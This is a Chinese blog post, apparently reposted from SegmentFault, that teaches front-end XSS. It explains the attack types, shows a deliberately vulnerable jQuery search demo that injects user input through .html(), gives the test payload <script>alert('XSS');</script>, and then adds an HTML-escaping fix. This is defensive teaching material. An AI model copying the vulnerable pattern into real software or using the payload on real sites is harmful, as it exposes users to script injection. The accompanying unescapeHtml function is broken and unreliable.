<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"hmxyl.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="XSS漏洞处理">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS漏洞处理">
<meta property="og:url" content="https://hmxyl.github.io/20250619/409b5317.html">
<meta property="og:site_name" content="Alisa&#39;s Home">
<meta property="og:description" content="XSS漏洞处理">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSv-1670834128685-1.png">
<meta property="og:image" content="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSp-1670834128685-3.png">
<meta property="og:image" content="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSa-1670834128685-5.png">
<meta property="og:image" content="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSt-1670834128685-7.png">
<meta property="article:published_time" content="2025-06-19T08:57:01.000Z">
<meta property="article:modified_time" content="2025-06-20T12:49:16.339Z">
<meta property="article:author" content="Alisa">
<meta property="article:tag" content="网络安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSv-1670834128685-1.png">


<link rel="canonical" href="https://hmxyl.github.io/20250619/409b5317.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hmxyl.github.io/20250619/409b5317.html","path":"20250619/409b5317.html","title":"XSS漏洞处理"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>XSS漏洞处理 | Alisa's Home</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Alisa's Home</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Alisa's Home</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">前端安全系列：XSS篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.</span> <span class="nav-text">XSS攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E6%94%BB%E5%87%BB%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.2.</span> <span class="nav-text">XSS攻击的危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.3.</span> <span class="nav-text">XSS漏洞的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.1.</span> <span class="nav-text">本地利用漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%BC%8F%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.2.</span> <span class="nav-text">反射式漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%BC%8F%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.3.</span> <span class="nav-text">存储式漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E5%AF%B9%E6%AF%94"><span class="nav-number">1.3.4.</span> <span class="nav-text">大致对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-%E5%B8%B8%E8%A7%81%E6%A1%88%E4%BE%8B"><span class="nav-number">1.4.</span> <span class="nav-text">XSS 常见案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E6%96%B0%E4%B8%8A%E7%BA%BF%E4%B8%80%E4%B8%AA%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD-B%E5%86%99%E4%BA%86%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81"><span class="nav-number">1.4.1.</span> <span class="nav-text">公司网站新上线一个搜索功能,B写了这段代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%9F%90%E4%BA%9B%E4%B8%9A%E5%8A%A1-%E4%BE%8B%E5%A6%82%E7%99%BB%E5%BD%95-%E8%AE%A2%E5%8D%95%E7%AD%89%E9%9C%80%E8%A6%81%E6%90%BA%E5%B8%A6%E5%8F%82%E6%95%B0%E6%88%96%E8%80%85%E9%87%8D%E5%AE%9A%E5%90%91%E7%AD%89%E4%BF%A1%E6%81%AF-B%E5%86%99%E4%BA%86%E8%BF%99%E4%B9%88%E4%B8%80%E4%B8%AA%E9%A1%B5%E9%9D%A2"><span class="nav-number">1.4.2.</span> <span class="nav-text">基于某些业务,例如登录,订单等需要携带参数或者重定向等信息,B写了这么一个页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%98%E6%9C%89%E7%A7%8D%E5%86%85%E8%81%94%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95-%E5%B0%86%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%95%B0%E6%8D%AE%E9%80%9A%E8%BF%87URL%E4%BC%A0%E9%80%92%E7%BB%99%E5%85%B6%E4%BB%96%E9%A1%B5%E9%9D%A2%E4%BD%BF%E7%94%A8"><span class="nav-number">1.4.3.</span> <span class="nav-text">还有种内联数据用法,将序列化的数据通过URL传递给其他页面使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#A%E9%80%9A%E8%BF%87%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%9C%A8%E9%A1%B5%E9%9D%A2%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7%E6%81%B6%E6%84%8F%E8%AF%B7%E6%B1%82"><span class="nav-number">1.4.4.</span> <span class="nav-text">A通过恶意脚本在页面插入图片自动发起恶意请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#A%E9%80%9A%E8%BF%87%E4%BA%8B%E4%BB%B6%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC"><span class="nav-number">1.4.5.</span> <span class="nav-text">A通过事件注入恶意脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#A%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%B7%B7%E5%90%88%E7%BC%96%E7%A0%81%E7%BB%84%E8%A3%85"><span class="nav-number">1.4.6.</span> <span class="nav-text">A利用浏览器的解码顺序进行混合编码组装</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">1.5.</span> <span class="nav-text">XSS攻击方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">1.6.</span> <span class="nav-text">防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-Filter"><span class="nav-number">1.6.1.</span> <span class="nav-text">XSS Filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML-Entity-%E4%B8%BE%E4%BE%8B%E9%83%A8%E5%88%86"><span class="nav-number">1.6.2.</span> <span class="nav-text">HTML Entity(举例部分)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E9%99%90%E5%88%B6"><span class="nav-number">1.6.3.</span> <span class="nav-text">请求限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E4%B8%BE%E4%BE%8B"><span class="nav-number">1.6.4.</span> <span class="nav-text">防御实现代码举例</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Alisa</p>
  <div class="site-description" itemprop="description">学习笔记、工作心得</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">101</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">45</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hmxyl.github.io/20250619/409b5317.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Alisa">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisa's Home">
      <meta itemprop="description" content="学习笔记、工作心得">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="XSS漏洞处理 | Alisa's Home">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          XSS漏洞处理
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-06-19 16:57:01" itemprop="dateCreated datePublished" datetime="2025-06-19T16:57:01+08:00">2025-06-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-06-20 20:49:16" itemprop="dateModified" datetime="2025-06-20T20:49:16+08:00">2025-06-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000019980090">前端安全系列：XSS篇</a></h1>
<h2 id="XSS攻击">XSS攻击</h2>
<p>全称跨站脚本攻击，为不和<code>层叠样式表(Cascading Style Sheets, CSS)</code>的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中</p>
<h2 id="XSS攻击的危害">XSS攻击的危害</h2>
<ol>
<li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗窃企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其它网站发起攻击</li>
</ol>
<h2 id="XSS漏洞的分类">XSS漏洞的分类</h2>
<h3 id="本地利用漏洞">本地利用漏洞</h3>
<p>这种漏洞存在于浏览器页面中,属于前端自身问题基于DOM文档对象模型的一种漏洞,大概步骤:</p>
<ol>
<li>A给B发送一个恶意构造的URL</li>
<li>B打开恶意URL</li>
<li>B的浏览器页面中包含恶意代码</li>
<li>A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为</li>
</ol>
<p>通过修改浏览器页面中的DOM(DocumentObjectModel)时，就有可能产生这种漏洞</p>
<h3 id="反射式漏洞">反射式漏洞</h3>
<p>服务端没有对数据进行过滤、验证或者编码等处理直接返回前端可能引起的漏洞</p>
<ol>
<li>A给B发送一个恶意构造的URL</li>
<li>B打开目标网站,浏览器将包含恶意代码的数据通过请求传递给服务端,其不加处理直接返回给浏览器</li>
<li>B的浏览器接收到响应后解析并执行的代码中包含恶意代码</li>
<li>A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为</li>
</ol>
<p>常见于网站搜索栏,登录注册等地方窃取用户cookies或者进行钓鱼欺骗.因为其中涉及到服务端的参与,想要避免需要后端协调.</p>
<h3 id="存储式漏洞">存储式漏洞</h3>
<p>类似反射式但是会把未经处理的数据储存在数据库中</p>
<ol>
<li>A将恶意代码提交到目标网站的数据库中</li>
<li>B打开目标网站,服务端将恶意代码从数据库取出拼接在HTML中返回给浏览器</li>
<li>B的浏览器接收到响应后解析并执行的代码中包含恶意代码</li>
<li>A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为</li>
</ol>
<p>这是属于持久性攻击,涉及范围可能包括所有的访问用户,一般常用网站留言,评论,博客日志等.</p>
<h3 id="大致对比">大致对比</h3>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th>本地利用</th>
<th>反射式</th>
<th>存储式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">触发</td>
<td>用户打开恶意构造的URL</td>
<td>用户打开恶意构造的URL</td>
<td>1. 用户打开恶意构造的URL <br>2. 攻击者构造脚本</td>
</tr>
<tr>
<td style="text-align:center">储存</td>
<td>URL</td>
<td>URL</td>
<td>数据库</td>
</tr>
<tr>
<td style="text-align:center">输出</td>
<td>前端</td>
<td>后端</td>
<td>后端</td>
</tr>
<tr>
<td style="text-align:center">方式</td>
<td>DOM</td>
<td>HTTP响应</td>
<td>HTTP响应</td>
</tr>
</tbody>
</table>
<h2 id="XSS-常见案例">XSS 常见案例</h2>
<h3 id="公司网站新上线一个搜索功能-B写了这段代码">公司网站新上线一个搜索功能,B写了这段代码</h3>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">input</span> {</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">            }</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            input:</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"in"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">id</span>=<span class="string">"submit"</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            output:</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"out"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://libs.baidu.com/jquery/2.0.0/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            $(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> $input = $(<span class="string">'#in'</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> $output = $(<span class="string">'#out'</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> $submit = $(<span class="string">'#submit'</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                $submit.<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> val = $input.<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">                    $output.<span class="title function_">val</span>(val).<span class="title function_">html</span>(val);</span></span><br><span class="line"><span class="language-javascript">                });</span></span><br><span class="line"><span class="language-javascript">            });</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=FNz4mkAO1XJLu2iC5i%2FPiw%3D%3D.cmiLfQq4GjBOFv2hua84FGOkLqWF9bOwgmu05qyXEXrGfHQlIS8vcph9iSsQQCdt">demo1</a><br>
某天,让A知道之后他输入这么一段代码,然后提交之后发现</p>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'XSS'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSv-1670834128685-1.png" alt="图片描述"></p>
<p>类似的用户输入内容都可能被攻击者利用拼接特殊格式的字符串形成恶意代码,通过注入脚本引发潜在风险,浏览器不会区分善恶,只是按照代码解析,于是B想了一个办法告诉浏览器这段内容不该解析,所以改了一下,简单转义输入内容</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">text</span>) {</span><br><span class="line">  <span class="keyword">return</span> text.<span class="title function_">replace</span>(<span class="regexp">/[&lt;&gt;"&amp;]/g</span>, <span class="keyword">function</span>(<span class="params">match, pos, originalText</span>) {</span><br><span class="line">    <span class="keyword">switch</span> (match) {</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;'</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;gt;'</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&amp;'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;amp;'</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'"'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;quot;'</span>;</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">unescapeHtml</span>(<span class="params">str</span>) {</span><br><span class="line">  <span class="keyword">return</span> text.<span class="title function_">replace</span>(<span class="regexp">/[&lt;&gt;"&amp;]/g</span>, <span class="keyword">function</span>(<span class="params">match, pos, originalText</span>) {</span><br><span class="line">    <span class="keyword">switch</span> (match) {</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&amp;lt;'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;'</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&amp;gt;'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&gt;'</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&amp;amp;'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;'</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&amp;quot;'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'"'</span>;</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$submit.<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> val = <span class="title function_">escapeHtml</span>($input.<span class="title function_">val</span>());</span><br><span class="line">  $output.<span class="title function_">val</span>(val).<span class="title function_">html</span>(val);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=7%2BulsDr5cJb65Dru5wIBLQ%3D%3D.MkzYuT3mLjcpFBshJDeed1lo4CRy1%2B3FKB29NhvTZir3%2FCtA8ETGTLsUMhvFmQXW">demo2</a><br>
